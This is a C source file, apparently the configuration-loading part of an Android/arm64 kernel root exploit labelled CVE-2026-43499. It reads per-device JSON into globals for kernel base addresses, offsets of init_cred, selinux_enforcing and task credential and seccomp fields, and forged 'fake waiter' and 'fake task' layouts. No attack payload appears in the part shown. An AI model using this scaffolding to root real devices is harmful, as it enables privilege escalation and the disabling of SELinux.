#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include "flat_json.h"

uint64_t KIMAGE_TEXT_BASE             = 0xffffffc080000000ULL;
uint64_t MTK_VADDR_BASE               = 0xffffffc000000000ULL;
uint64_t P0_PAGE_OFFSET               = 0xffffff8000000000ULL;
uint64_t P0_PHYS_OFFSET               = 0x80000000ULL;
uint64_t P0_KERNEL_PHYS_LOAD          = 0xa8000000ULL;
uint64_t QC_GKI_6_12_PHYS_LOAD        = 0xc7800000ULL;
uint64_t XRING_KERNEL_PHYS_LOAD       = 0x80200000ULL;
uint64_t KERNELSNITCH_IDENTITY_START  = 0xffffff8000000000ULL;
uint64_t KERNELSNITCH_IDENTITY_END    = 0xffffff8c00000000ULL;
uint64_t DIRECT_MAP_BASE              = 0xffffff8000000000ULL;
uint64_t DIRECT_MAP_END               = 0xffffff9000000000ULL;
uint64_t VMEMMAP_START                = 0xfffffffe00000000ULL;

/* Symbol offsets. */
uint32_t INIT_TASK_OFF = 0;
uint32_t INIT_CRED_OFF = 0;
uint32_t ROOT_TASK_GROUP_OFF = 0;
uint32_t SELINUX_ENFORCING_OFF = 0;

uint32_t PSELECT_WAITER_WORD_SHIFT = 0;

/* Fake waiter and task layouts. */
uint32_t FAKE_WAITER_TREE_PRIO_OFF = 0;
uint32_t FAKE_WAITER_TREE_DEADLINE_OFF = 0;
uint32_t FAKE_WAITER_PI_TREE_ENTRY_OFF = 0;
uint32_t FAKE_WAITER_PI_TREE_PRIO_OFF = 0;
uint32_t FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0;
uint32_t FAKE_WAITER_TASK_OFF = 0;
uint32_t FAKE_WAITER_LOCK_OFF = 0;
uint32_t FAKE_WAITER_WAKE_STATE_OFF = 0;
uint32_t FAKE_WAITER_WW_CTX_OFF = 0;

uint32_t FAKE_TASK_USAGE_OFF = 0;
uint32_t FAKE_TASK_PRIO_OFF = 0;
uint32_t FAKE_TASK_NORMAL_PRIO_OFF = 0;
uint32_t FAKE_TASK_TASK_GROUP_OFF = 0;
uint32_t FAKE_TASK_PI_LOCK_OFF = 0;
uint32_t FAKE_TASK_PI_WAITERS_OFF = 0;
uint32_t FAKE_TASK_PI_TOP_TASK_OFF = 0;
uint32_t FAKE_TASK_PI_BLOCKED_ON_OFF = 0;

uint32_t TASK_CRED_OFF = 0;
uint32_t TASK_COMM_OFF = 0;
uint32_t TASK_THREAD_INFO_FLAGS_OFF = 0;
uint32_t TASK_SECCOMP_OFF = 0;

uint32_t COMPACT_WAITER = 0;
uint32_t MM_STRUCT_SZ = 0;

uint32_t STRUCT_PAGE_SIZE = 0;

uint32_t LOCK_OFF = 0;
uint32_t W0_OFF = 0;
uint32_t FOPS_OFF = 0;
uint32_t RIGHT_OFF = 0;
uint32_t LEFT_OFF = 0;
uint32_t FAKE_TASK_OFF = 0;

/* ---- CVE-2026-43499 patch-config file loading ---- */

/* Read a whole file into a freshly-allocated NUL-terminated buffer.
 * Returns true on success; *out / *out_len receive the buffer and length
 * (length excludes the trailing NUL). */
static bool read_file_contents(const char *path, char **out, size_t *out_len) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    printf("open config file failed: %s errno=%d\n", path, errno);
    return false;
  }
  struct stat st;
  if (fstat(fd, &st) != 0) {
    printf("fstat config file failed: %s errno=%d\n", path, errno);
    close(fd);
    return false;
  }
  printf("[DEBUG read_file_contents] path=%s size=%lld mode=%o\n",
         path, (long long)st.st_size, st.st_mode);
  if (st.st_size <= 0) {
    printf("empty config file\n");
    close(fd);
    return false;
  }

  char *buf = (char *)malloc((size_t)st.st_size + 1);
  if (!buf) {
    printf("out of memory reading config file\n");
    close(fd);
    return false;
  }
  size_t total = 0;
  while (total < (size_t)st.st_size) {
    ssize_t n = read(fd, buf + total, (size_t)st.st_size - total);
    if (n < 0) {
      if (errno == EINTR) continue;
      printf("read config file failed: errno=%d\n", errno);
      free(buf);
      close(fd);
      return false;
    }
    if (n == 0) break;
    total += (size_t)n;
  }
  close(fd);
  buf[total] = '\0';

  *out = buf;
  *out_len = total;
  return true;
}

/* Locate the JSON payload: the first '{' marks the start.
 * Sets *start to the opening '{' and *end to the matching closing '}'.
 * Returns true if found. */
static bool extract_json_payload(const char *text, const char **start, const char **end) {
  const char *s = strchr(text, '{');
  if (!s) return false;

  /* Pair up braces so nested objects/arrays don't truncate the payload. */
  int depth = 0;
  const char *e = NULL;
  for (const char *q = s; *q; q++) {
    if (*q == '{') depth++;
    else if (*q == '}' && --depth == 0) {
      e = q;
      break;
    }
  }
  if (!e) return false;

  *start = s;
  *end = e;
  return true;
}

/* Load the CVE-2026-43499 patch-config JSON from `path` into `out_json`.
 * The caller owns the buffer: `out_json` must have room for `out_json_size`
 * bytes (including the terminating NUL). The file is plain text; only the
 * payload between the outermost braces is kept. */
bool load_patch_json_from_file(const char *path, char *out_json,
                               size_t out_json_size) {
  if (!out_json || out_json_size == 0) {
    printf("invalid output buffer\n");
    return false;
  }

  char *buf = NULL;
  size_t len = 0;
  if (!read_file_contents(path, &buf, &len)) {
    printf("read file failed: %s\n", path);
    return false;
  }

  const char *start = NULL;
  const char *end = NULL;
  if (!extract_json_payload(buf, &start, &end)) {
    printf("json braces not found in config file\n");
    free(buf);
    return false;
  }

  size_t json_len = (size_t)(end - start) + 1;
  if (json_len >= out_json_size) {
    printf("json too large: %zu (max %zu)\n", json_len, out_json_size - 1);
    free(buf);
    return false;
  }

  memcpy(out_json, start, json_len);
  out_json[json_len] = '\0';
  free(buf);
  return true;
}

bool load_cve2026_43499_config(const char *json_text) {
  FlatJson json;
  flat_json_init(&json);
  if (!flat_json_parse(&json, json_text, strlen(json_text))) return false;

#define LOAD_U32(name) \
  name = flat_json_get_u32_or(&json, #name, name)

#define LOAD_U64(name) \
  name = flat_json_get_u64_or(&json, #name, name)


  /* =========================
    * Kernel address parameters
    * ========================= */

  LOAD_U64(KIMAGE_TEXT_BASE);
  LOAD_U64(P0_PAGE_OFFSET);
  LOAD_U64(P0_PHYS_OFFSET);
  LOAD_U64(P0_KERNEL_PHYS_LOAD);

  LOAD_U64(KERNELSNITCH_IDENTITY_START);
  LOAD_U64(KERNELSNITCH_IDENTITY_END);

  LOAD_U64(DIRECT_MAP_BASE);
  LOAD_U64(DIRECT_MAP_END);

  LOAD_U64(VMEMMAP_START);


  /* =========================
    * Kernel symbol offsets
    * ========================= */

  LOAD_U32(INIT_TASK_OFF);
  LOAD_U32(INIT_CRED_OFF);
  LOAD_U32(ROOT_TASK_GROUP_OFF);
  LOAD_U32(SELINUX_ENFORCING_OFF);

  LOAD_U32(PSELECT_WAITER_WORD_SHIFT);

  LOAD_U32(FAKE_WAITER_TREE_PRIO_OFF);
  LOAD_U32(FAKE_WAITER_TREE_DEADLINE_OFF);
  LOAD_U32(FAKE_WAITER_PI_TREE_ENTRY_OFF);
  LOAD_U32(FAKE_WAITER_PI_TREE_PRIO_OFF);
  LOAD_U32(FAKE_WAITER_PI_TREE_DEADLINE_OFF);
  LOAD_U32(FAKE_WAITER_TASK_OFF);
  LOAD_U32(FAKE_WAITER_LOCK_OFF);
  LOAD_U32(FAKE_WAITER_WAKE_STATE_OFF);
  LOAD_U32(FAKE_WAITER_WW_CTX_OFF);

  LOAD_U32(FAKE_TASK_USAGE_OFF);
  LOAD_U32(FAKE_TASK_PRIO_OFF);
  LOAD_U32(FAKE_TASK_NORMAL_PRIO_OFF);
  LOAD_U32(FAKE_TASK_TASK_GROUP_OFF);
  LOAD_U32(FAKE_TASK_PI_LOCK_OFF);
  LOAD_U32(FAKE_TASK_PI_WAITERS_OFF);
  LOAD_U32(FAKE_TASK_PI_TOP_TASK_OFF);
  LOAD_U32(FAKE_TASK_PI_BLOCKED_ON_OFF);

  LOAD_U32(TASK_CRED_OFF);
  LOAD_U32(TASK_COMM_OFF);
  LOAD_U32(TASK_THREAD_INFO_FLAGS_OFF);
  LOAD_U32(TASK_SECCOMP_OFF);

  LOAD_U32(COMPACT_WAITER);
  LOAD_U32(MM_STRUCT_SZ);

  LOAD_U32(STRUCT_PAGE_SIZE);

  LOAD_U32(LOCK_OFF);
  LOAD_U32(W0_OFF);
  LOAD_U32(FOPS_OFF);
  LOAD_U32(RIGHT_OFF);
  LOAD_U32(LEFT_OFF);
  LOAD_U32(FAKE_TASK_OFF);

#undef LOAD_U32
#undef LOAD_U64

  flat_json_destroy(&json);
  return true;
}

